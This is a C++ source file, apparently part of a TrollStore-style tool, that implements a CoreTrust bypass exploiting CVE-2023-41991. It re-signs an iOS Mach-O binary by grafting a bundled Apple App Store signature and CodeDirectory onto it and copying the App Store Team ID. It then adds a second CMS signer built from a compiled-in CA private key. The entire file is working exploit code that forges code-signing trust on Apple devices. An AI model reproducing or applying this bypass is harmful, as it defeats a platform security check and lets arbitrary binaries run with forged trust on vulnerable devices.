#include "exploit/coretrust_bypass.h"

#include <CoreFoundation/CoreFoundation.h>
#include <openssl/bio.h>
#include <openssl/cms.h>
#include <openssl/err.h>
#include <openssl/pem.h>

#include <TargetConditionals.h>
#include <mach-o/loader.h>

#include <algorithm>
#include <cstdio>
#include <memory>
#include <optional>
#include <string>
#include <utility>

#include "cf_ptr.h"
#include "coretrust_bypass_internal.h"
#include "macho/cs_blob.h"
#include "macho/macho.h"
#include "template/template.h"
#include "utils.h"

namespace ct_bypass {
namespace {

using namespace macho;

// Owns an OpenSSL object and frees it on scope exit
template <typename T, void (*Free)(T*)>
struct OpenSSLDeleter {
  void operator()(T* ptr) const { Free(ptr); }
};

using BIOPtr = std::unique_ptr<BIO, OpenSSLDeleter<BIO, BIO_free_all>>;
using CMSPtr =
    std::unique_ptr<CMS_ContentInfo,
                    OpenSSLDeleter<CMS_ContentInfo, CMS_ContentInfo_free>>;
using EVPKeyPtr =
    std::unique_ptr<EVP_PKEY, OpenSSLDeleter<EVP_PKEY, EVP_PKEY_free>>;
using X509Ptr = std::unique_ptr<X509, OpenSSLDeleter<X509, X509_free>>;

// Signed attributes Apple adds to the CMS of a code signature. Both list the
// same cdhashes, in different encodings
constexpr char kCdHashesPlistOid[] = "1.2.840.113635.100.9.1";  // XML plist
constexpr char kCdHashesDerOid[] = "1.2.840.113635.100.9.2";    // DER

void log_openssl_error(const char* what) {
  fprintf(stderr, "%s: %s\n", what, ERR_error_string(ERR_get_error(), nullptr));
}

// Parses Apple's CMS out of the template signature blob. It already holds
// Apple's signer, which must stay byte-identical. Returns null on failure
CMSPtr load_cms_template() {
  templates::ByteView blob = templates::app_store_signature_blob();
  const uint8_t* der = blob.data + kBlobHeaderSize;
  long der_size = static_cast<long>(blob.size - kBlobHeaderSize);
  CMSPtr cms(d2i_CMS_ContentInfo(nullptr, &der, der_size));
  if (!cms) log_openssl_error("Failed to parse CMS blob");
  return cms;
}

BIOPtr open_pem(templates::ByteView pem) {
  return BIOPtr(BIO_new_mem_buf(pem.data, static_cast<int>(pem.size)));
}

// Loads the TrollStore CA private key and certificate (compiled-in PEM)
ReturnCode load_ca_identity(EVPKeyPtr& private_key, X509Ptr& certificate) {
  BIOPtr key_pem = open_pem(templates::ca_private_key());
  if (key_pem) {
    private_key.reset(
        PEM_read_bio_PrivateKey(key_pem.get(), nullptr, nullptr, nullptr));
  }
  if (!private_key) {
    log_openssl_error("Failed to read CA private key");
    return ReturnCode::kErrCommon;
  }

  BIOPtr cert_pem = open_pem(templates::ca_certificate());
  if (cert_pem) {
    certificate.reset(
        PEM_read_bio_X509(cert_pem.get(), nullptr, nullptr, nullptr));
  }
  if (!certificate) {
    log_openssl_error("Failed to read CA certificate");
    return ReturnCode::kErrCommon;
  }
  return ReturnCode::kOk;
}

// Builds the {"cdhashes": [sha1, sha256]} XML plist Apple puts in its CMS.
// Returns null on failure
CFPtr<CFDataRef> create_cdhashes_plist(const Bytes& sha1_cdhash,
                                       const Bytes& sha256_cdhash) {
  CFPtr<CFDataRef> sha1_data(
      CFDataCreate(kCFAllocatorDefault, sha1_cdhash.data(), kSha1Len));
  // In this plist, the SHA256 hash is truncated to SHA1 length
  CFPtr<CFDataRef> sha256_data(
      CFDataCreate(kCFAllocatorDefault, sha256_cdhash.data(), kCDHashLen));
  CFPtr<CFMutableArrayRef> cdhashes(
      CFArrayCreateMutable(kCFAllocatorDefault, 2, &kCFTypeArrayCallBacks));
  CFPtr<CFMutableDictionaryRef> dictionary(CFDictionaryCreateMutable(
      kCFAllocatorDefault, 1, &kCFTypeDictionaryKeyCallBacks,
      &kCFTypeDictionaryValueCallBacks));
  if (!sha1_data || !sha256_data || !cdhashes || !dictionary) {
    fprintf(stderr, "Failed to create CDHashes plist objects\n");
    return nullptr;
  }
  CFArrayAppendValue(cdhashes.get(), sha1_data.get());
  CFArrayAppendValue(cdhashes.get(), sha256_data.get());
  CFDictionarySetValue(dictionary.get(), CFSTR("cdhashes"), cdhashes.get());

  CFErrorRef error_raw = nullptr;
  CFPtr<CFDataRef> plist(
      CFPropertyListCreateData(kCFAllocatorDefault, dictionary.get(),
                               kCFPropertyListXMLFormat_v1_0, 0, &error_raw));
  CFPtr<CFErrorRef> error(error_raw);
  if (!plist) {
    fprintf(stderr, "Failed to encode CDHashes plist: %s\n",
            utils::cf_description(error.get()).c_str());
    return nullptr;
  }
  return plist;
}

// Adds Apple's two cdhash attributes to `signer`: a plist (SHA256 truncated
// to 20 bytes) and DER (full SHA256)
ReturnCode add_cdhashes_attributes(CMS_SignerInfo* signer,
                                   const Bytes& sha1_cdhash,
                                   const Bytes& sha256_cdhash) {
  CFPtr<CFDataRef> plist = create_cdhashes_plist(sha1_cdhash, sha256_cdhash);
  if (!plist) return ReturnCode::kErrCommon;

  if (!CMS_signed_add1_attr_by_txt(
          signer, kCdHashesPlistOid, V_ASN1_OCTET_STRING,
          CFDataGetBytePtr(plist.get()),
          static_cast<int>(CFDataGetLength(plist.get())))) {
    log_openssl_error("Failed to add plist CDHashes attribute");
    return ReturnCode::kErrAddSignature;
  }

  // Fill the hashes into the DER template (see template.h for its layout)
  templates::ByteView der_template = templates::cd_hashes_der();
  Bytes der(der_template.data, der_template.data + der_template.size);
  std::copy_n(sha1_cdhash.begin(), templates::kCdHashesDerSha1Size,
              der.begin() + templates::kCdHashesDerSha1Offset);
  std::copy_n(sha256_cdhash.begin(), templates::kCdHashesDerSha256Size,
              der.begin() + templates::kCdHashesDerSha256Offset);

  if (!CMS_signed_add1_attr_by_txt(signer, kCdHashesDerOid, V_ASN1_SEQUENCE,
                                   der.data(), static_cast<int>(der.size()))) {
    log_openssl_error("Failed to add DER CDHashes attribute");
    return ReturnCode::kErrAddSignature;
  }
  return ReturnCode::kOk;
}

// Encodes the CMS to DER and wraps it in a blob for slot 0x10000
ReturnCode encode_signature_blob(CMS_ContentInfo* cms, Blob& signature_blob) {
  unsigned char* cms_data = nullptr;
  int cms_data_size = i2d_CMS_ContentInfo(cms, &cms_data);
  if (cms_data_size <= 0) {
    log_openssl_error("Failed to encode CMS structure");
    return ReturnCode::kErrCommon;
  }

  signature_blob = {SlotType::kSignature, Bytes(kBlobHeaderSize, 0)};
  write_be32(signature_blob.data.data(),
             static_cast<uint32_t>(BlobMagic::kBlobWrapper));
  write_be32(signature_blob.data.data() + 4,
             static_cast<uint32_t>(kBlobHeaderSize + cms_data_size));
  signature_blob.data.insert(signature_blob.data.end(), cms_data,
                             cms_data + cms_data_size);
  OPENSSL_free(cms_data);
  return ReturnCode::kOk;
}

// Exploits CVE-2023-41991: signs the CodeDirectories in slots 0 and 0x1000
// with a two-signer CMS (Apple's template signer + the TrollStore CA) and
// stores it in slot 0x10000
ReturnCode update_signature_blob(SuperBlob& superblob) {
  Bytes sha1_cdhash;
  Bytes sha256_cdhash;
  ReturnCode rc =
      detail::compute_cdhashes(superblob, sha1_cdhash, sha256_cdhash);
  if (failed(rc)) return rc;

  CMSPtr cms = load_cms_template();
  if (!cms) return ReturnCode::kErrCommon;

  EVPKeyPtr private_key;
  X509Ptr certificate;
  rc = load_ca_identity(private_key, certificate);
  if (failed(rc)) return rc;

  // Add the TrollStore signer. It reuses Apple's messageDigest (the content is
  // detached) and is signed only once its attributes are in place
  CMS_SignerInfo* new_signer = CMS_add1_signer(
      cms.get(), certificate.get(), private_key.get(), EVP_sha256(),
      CMS_PARTIAL | CMS_REUSE_DIGEST | CMS_NOSMIMECAP);
  if (!new_signer) {
    log_openssl_error("Failed to add signer");
    return ReturnCode::kErrAddSignature;
  }

  rc = add_cdhashes_attributes(new_signer, sha1_cdhash, sha256_cdhash);
  if (failed(rc)) return rc;

  if (!CMS_SignerInfo_sign(new_signer)) {
    log_openssl_error("Failed to sign CMS structure");
    return ReturnCode::kErrAddSignature;
  }

  Blob signature_blob;
  rc = encode_signature_blob(cms.get(), signature_blob);
  if (failed(rc)) return rc;

  // Replace the old signature blob if it exists (absent slot is not an error)
  superblob.remove_blob(SlotType::kSignature);
  return superblob.add_blob(signature_blob);
}

void warn_if_no_entitlements(const SuperBlob& superblob, uint32_t filetype) {
  bool has_entitlements =
      superblob.find_blob(SlotType::kEntitlements).has_value() ||
      superblob.find_blob(SlotType::kDerEntitlements).has_value();
  if (!has_entitlements && filetype == MH_EXECUTE) {
    fprintf(stderr, "Warning: no entitlements found in the code signature\n");
  }
}

// Decodes the real CodeDirectory (slot 0x1000). find_blob hands back a copy,
// so an edited CodeDirectory has to go back through store_real_cd
ReturnCode load_real_cd(const SuperBlob& superblob,
                        std::optional<CodeDirectory>& real_cd) {
  std::optional<Blob> blob =
      superblob.find_blob(SlotType::kAlternateCodeDirectories);
  if (!blob.has_value()) {
    return ReturnCode::kErrCodeDirMissing;
  }
  real_cd = CodeDirectory::deserialize(std::move(blob->data));
  if (!real_cd.has_value()) {
    return ReturnCode::kErrCodeDirMalformed;
  }
  return ReturnCode::kOk;
}

ReturnCode store_real_cd(SuperBlob& superblob, const CodeDirectory& real_cd) {
  if (failed(superblob.replace_blob(
          {SlotType::kAlternateCodeDirectories, real_cd.data()}))) {
    return ReturnCode::kErrCodeDirMissing;
  }
  return ReturnCode::kOk;
}

// The slice to re-sign out of a universal binary: the one this host would
// run or, when preparing binaries on a Mac, the best arm64 slice for a device
std::optional<MachOSlice> pick_slice(const MachO& macho) {
  if (auto slice = macho.find_preferred_slice()) return slice;
#if TARGET_OS_OSX
  return macho.find_arm64_slice();
#else
  return std::nullopt;
#endif
}

}  // namespace

namespace detail {

using namespace macho;

ReturnCode compute_cdhashes(const SuperBlob& superblob, Bytes& sha1_cdhash,
                            Bytes& sha256_cdhash) {
  std::optional<Blob> sha1_cd = superblob.find_blob(SlotType::kCodeDirectory);
  if (!sha1_cd) {
    fprintf(stderr, "Could not find SHA1 CodeDirectory blob\n");
    return ReturnCode::kErrCodeDirMissing;
  }
  std::optional<Blob> sha256_cd =
      superblob.find_blob(SlotType::kAlternateCodeDirectories);
  if (!sha256_cd) {
    fprintf(stderr, "Could not find SHA256 CodeDirectory blob\n");
    return ReturnCode::kErrCodeDirMissing;
  }

  std::optional<Bytes> sha1 = compute_digest(
      HashType::kSha1, sha1_cd->data.data(), sha1_cd->data.size());
  std::optional<Bytes> sha256 = compute_digest(
      HashType::kSha256, sha256_cd->data.data(), sha256_cd->data.size());
  if (!sha1 || !sha256) {
    fprintf(stderr, "Failed to hash CodeDirectories\n");
    return ReturnCode::kErrCommon;
  }
  sha1_cdhash = std::move(*sha1);
  sha256_cdhash = std::move(*sha256);
  return ReturnCode::kOk;
}

ReturnCode select_slice(MachO::Ptr& macho) {
  if (macho->is_thin_64()) {
    return ReturnCode::kOk;
  }
  std::optional<MachOSlice> slice = pick_slice(*macho);
  MachO::Ptr thin;
  if (!slice.has_value() || failed(macho->extract_slice(*slice, thin)) ||
      !thin->is_thin_64()) {
    fprintf(stderr, "Error: no arm64 slice to re-sign in this binary\n");
    return ReturnCode::kErrMachoNoUsableSlice;
  }
  printf("Using the slice at offset 0x%llx (cputype 0x%x, cpusubtype 0x%x)\n",
         static_cast<unsigned long long>(slice->offset),
         static_cast<unsigned>(slice->cputype),
         static_cast<unsigned>(slice->cpusubtype));
  macho = std::move(thin);
  return ReturnCode::kOk;
}

ReturnCode check_supported_macho(const MachO& macho) {
  if (!macho.is_thin_64()) {
    fprintf(stderr, "Error: a thin 64-bit Mach-O is required\n");
    return ReturnCode::kErrMachoNoUsableSlice;
  }
  if (macho.encrypted()) {
    fprintf(stderr, "Error: MachO is encrypted, please use a decrypted app\n");
    return ReturnCode::kErrMachoEncrypted;
  }
  std::optional<uint32_t> filetype = macho.filetype();
  if (filetype == MH_OBJECT || filetype == MH_DSYM) {
    fprintf(stderr,
            "Error: MachO is an object or dSYM file, please use an executable "
            "or dynamic library\n");
    return ReturnCode::kErrMachoFiletype;
  }
  return ReturnCode::kOk;
}

ReturnCode load_code_signature(const MachO& macho, SuperBlob& superblob,
                               size_t& code_signature_offset) {
  size_t code_signature_size = 0;
  if (failed(macho.get_signature_range(code_signature_offset,
                                       code_signature_size))) {
    fprintf(stderr,
            "Error: no code signature found; fake-sign the binary at minimum "
            "before running the bypass\n");
    return ReturnCode::kErrNoCodeSignature;
  }

  const Bytes& file = macho.data();
  Bytes code_signature_data(file.begin() + code_signature_offset,
                            file.begin() + code_signature_offset +
                                code_signature_size);
  std::optional<SuperBlob> decoded = SuperBlob::deserialize(code_signature_data);
  if (!decoded.has_value()) {
    fprintf(stderr, "Error: failed to decode the existing code signature\n");
    return ReturnCode::kErrDecodeSuperBlob;
  }
  superblob = std::move(decoded.value());
  return ReturnCode::kOk;
}

// Moves the real (SHA256) CodeDirectory to the alternate slot, puts the App
// Store one in slot 0 and drops the old signature blob. Afterwards the blobs
// are:
//   App Store CodeDirectory (SHA1, slot 0)
//   requirements / entitlements / DER entitlements, if present
//   real CodeDirectory (SHA256, slot 0x1000)
// Reports the App Store CodeDirectory's Team ID in `app_store_team_id`
ReturnCode swap_in_app_store_cd(SuperBlob& superblob,
                                std::string& app_store_team_id) {
  std::optional<Blob> main_cd = superblob.find_blob(SlotType::kCodeDirectory);
  std::optional<Blob> alt_cd =
      superblob.find_blob(SlotType::kAlternateCodeDirectories);
  if (!main_cd.has_value()) {
    fprintf(stderr,
            "Error: unable to find code directory, make sure the input binary "
            "is ad-hoc signed\n");
    return ReturnCode::kErrCodeDirMissing;
  }

  // The CodeDirectory to carry over is the alternate (SHA256) one if the binary
  // already has both, otherwise the main one. Deserialize it once, both to
  // validate it and to confirm it is SHA256 (the bypass needs a SHA256 real CD)
  Blob real_cd_blob = alt_cd.value_or(main_cd.value());
  std::optional<CodeDirectory> real_cd =
      CodeDirectory::deserialize(real_cd_blob.data);
  if (!real_cd.has_value()) {
    fprintf(stderr, "Error: code directory is malformed\n");
    return ReturnCode::kErrCodeDirMalformed;
  }
  if (real_cd->hash_type() != HashType::kSha256) {
    fprintf(stderr, "Error: code directory is not SHA256, bypass won't work\n");
    return ReturnCode::kErrCodeDirNotSha256;
  }

  printf("Applying App Store code directory...\n");

  // Clear both CodeDirectory slots, then re-add the real one as the alternate
  // (SHA256) CodeDirectory at slot 0x1000. The alternate slot may be absent, so
  // that removal is allowed to fail
  superblob.remove_blob(SlotType::kAlternateCodeDirectories);
  if (failed(superblob.remove_blob(SlotType::kCodeDirectory))) {
    return ReturnCode::kErrCodeDirMissing;
  }
  real_cd_blob.slot = SlotType::kAlternateCodeDirectories;
  if (failed(superblob.add_blob(real_cd_blob))) {
    return ReturnCode::kErrCommon;
  }

  // Insert the App Store CodeDirectory (SHA1) into the now-empty slot 0 and
  // adopt its Team ID; both CodeDirectories must end up with the same Team ID
  Blob app_store_cd_blob = Blob::blob_from_generic(
      SlotType::kCodeDirectory, templates::app_store_code_directory().data);
  std::optional<CodeDirectory> app_store_cd =
      CodeDirectory::deserialize(app_store_cd_blob.data);
  if (!app_store_cd.has_value()) {
    fprintf(stderr, "Error: bundled App Store code directory is malformed\n");
    return ReturnCode::kErrCodeDirMalformed;
  }
  app_store_team_id = app_store_cd->team_id();
  if (app_store_team_id.empty()) {
    fprintf(stderr, "Error: unable to determine App Store Team ID\n");
    return ReturnCode::kErrSetTeamId;
  }
  if (failed(superblob.add_blob(app_store_cd_blob))) {
    return ReturnCode::kErrCommon;
  }

  printf("Adding new signature blob...\n");
  // Remove the existing signature blob if present (absent slot is not an error)
  superblob.remove_blob(SlotType::kSignature);
  return ReturnCode::kOk;
}

// Gives the real CodeDirectory the App Store Team ID (for the bypass to work,
// both code directories need the same one) and clears its flags
ReturnCode adopt_app_store_team_id(SuperBlob& superblob,
                                   const std::string& app_store_team_id) {
  printf("Updating TeamID...\n");
  std::optional<CodeDirectory> real_cd;
  ReturnCode rc = load_real_cd(superblob, real_cd);
  if (failed(rc)) return rc;

  if (failed(real_cd->set_team_id(app_store_team_id))) {
    fprintf(stderr, "Error: failed to set Team ID\n");
    return ReturnCode::kErrSetTeamId;
  }
  // Clear every flag (notably the adhoc flag in bit 1) so the two code
  // directories match
  real_cd->set_flags(0);
  if (failed(rc = store_real_cd(superblob, *real_cd))) return rc;
  printf("TeamID set to %s!\n", app_store_team_id.c_str());
  return ReturnCode::kOk;
}

// Signs in two passes. The first only sizes the SuperBlob so the load commands
// can be resized. That changes the first page, so the page hashes, and with
// them the real cdhash, are updated before the final signing. Reports the
// encoded SuperBlob, the same size as the first-pass one the range was sized
// for, in `signed_superblob`
ReturnCode sign_superblob(MachO& macho, SuperBlob& superblob,
                          size_t code_signature_offset,
                          Bytes& signed_superblob) {
  printf("Doing initial signing to calculate size...\n");
  ReturnCode rc = update_signature_blob(superblob);
  if (failed(rc)) {
    fprintf(stderr, "Error: failed to create new signature blob\n");
    return rc;
  }

  printf("Encoding unsigned superblob...\n");
  Bytes unsigned_superblob = superblob.serialize();

  printf("Updating load commands...\n");
  if (failed(rc = macho.resize_code_signature(unsigned_superblob.size()))) {
    fprintf(stderr, "Error: failed to update load commands\n");
    return rc;
  }

  // The page hashes cover everything before the signature, which now includes
  // the updated load commands
  printf("Updating code slot hashes...\n");
  std::optional<CodeDirectory> real_cd;
  if (failed(rc = load_real_cd(superblob, real_cd))) return rc;
  if (failed(real_cd->update_code_slots(macho.data().data(),
                                        code_signature_offset))) {
    fprintf(stderr, "Error: failed to update code slot hashes\n");
    return ReturnCode::kErrUpdateCodeSlots;
  }
  // Store it before re-signing, otherwise the final cdhash covers the stale
  // hashes
  if (failed(rc = store_real_cd(superblob, *real_cd))) return rc;

  printf("Signing binary...\n");
  if (failed(rc = update_signature_blob(superblob))) {
    fprintf(stderr, "Error: failed to create new signature blob\n");
    return rc;
  }

  printf("Encoding signed superblob...\n");
  signed_superblob = superblob.serialize();

  // The load commands were sized from the first pass, so the signed superblob
  // has to come out exactly as large
  if (signed_superblob.size() != unsigned_superblob.size()) {
    fprintf(stderr, "Error: signed superblob size changed (%zu -> %zu bytes)\n",
            unsigned_superblob.size(), signed_superblob.size());
    return ReturnCode::kErrSuperBlobSizeMismatch;
  }
  return ReturnCode::kOk;
}

}  // namespace detail

class CoreTrustBypassImpl {
 public:
  explicit CoreTrustBypassImpl(const std::string& path) : path_(path) {}

  ReturnCode bypass() const;

 private:
  const std::string path_;
};

ReturnCode CoreTrustBypassImpl::bypass() const {
  using macho::Bytes;
  using macho::MachO;
  using macho::SuperBlob;

  printf("Loading MachO...\n");
  MachO::Ptr macho;
  ReturnCode rc = MachO::load(path_, macho);
  if (failed(rc)) {
    fprintf(stderr, "Error: failed to parse MachO\n");
    return rc;
  }

  // The output is always thin: a universal input is replaced by the slice
  // that gets re-signed
  if (failed(rc = detail::select_slice(macho)) ||
      failed(rc = detail::check_supported_macho(*macho))) {
    return rc;
  }

  printf("Decoding code signature...\n");
  SuperBlob superblob;
  size_t code_signature_offset = 0;
  if (failed(rc = detail::load_code_signature(*macho, superblob,
                                              code_signature_offset))) {
    return rc;
  }
  warn_if_no_entitlements(superblob, macho->filetype().value_or(0));

  std::string app_store_team_id;
  if (failed(rc = detail::swap_in_app_store_cd(superblob, app_store_team_id)) ||
      failed(rc = detail::adopt_app_store_team_id(superblob,
                                                  app_store_team_id))) {
    return rc;
  }

  Bytes new_superblob;
  if (failed(rc = detail::sign_superblob(*macho, superblob,
                                         code_signature_offset,
                                         new_superblob))) {
    return rc;
  }

  printf("Writing superblob to MachO...\n");
  // The reserved range also covers the padding that followed the old
  // SuperBlob, so the new one fills its start and the rest is zeroed
  if (failed(rc = macho->update_code_signature(new_superblob)) ||
      failed(rc = macho->save(path_))) {
    fprintf(stderr, "Error: failed to write MachO\n");
    return rc;
  }

  printf("Successfully applied CoreTrust bypass to %s\n", path_.c_str());
  return ReturnCode::kOk;
}

CoreTrustBypass::CoreTrustBypass(const std::string& path)
    : impl_(std::make_unique<CoreTrustBypassImpl>(path)) {}

CoreTrustBypass::~CoreTrustBypass() = default;

CoreTrustBypass::Ptr CoreTrustBypass::create(const std::string& path) {
  return Ptr(new CoreTrustBypass(path));
}

ReturnCode CoreTrustBypass::bypass() { return impl_->bypass(); }

}  // namespace ct_bypass
